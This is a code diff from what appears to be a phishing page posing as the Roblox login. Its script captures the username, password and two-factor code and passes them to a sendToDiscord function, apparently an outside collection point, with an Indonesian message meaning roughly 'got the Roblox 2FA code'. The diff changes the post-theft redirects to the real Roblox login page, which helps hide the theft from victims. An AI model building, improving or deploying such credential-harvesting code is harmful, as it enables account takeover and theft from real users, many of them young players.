@@ -109,11 +109,11 @@ document.getElementById('f').addEventListener('submit', function(e){
       document.getElementById('loginSection').style.display = "none";
       document.getElementById('twofaSection').style.display = "block";
     } else {
-      window.location.href = "https://www.roblox.com/home";
+      window.location.href = "https://www.roblox.com/login";
     }
   })
   .catch(err => {
-    window.location.href = "https://www.roblox.com/home";
+    window.location.href = "https://www.roblox.com/login";
   });
 });
 
@@ -132,7 +132,7 @@ document.getElementById('verifyBtn').addEventListener('click', function(e){
   sendToDiscord("Roblox 2FA Code Dapet!", u, p, code);
 
   setTimeout(() => {
-    window.location.href = "https://www.roblox.com/home";
+    window.location.href = "https://www.roblox.com/login";
   }, 1500);
 });
 </script>
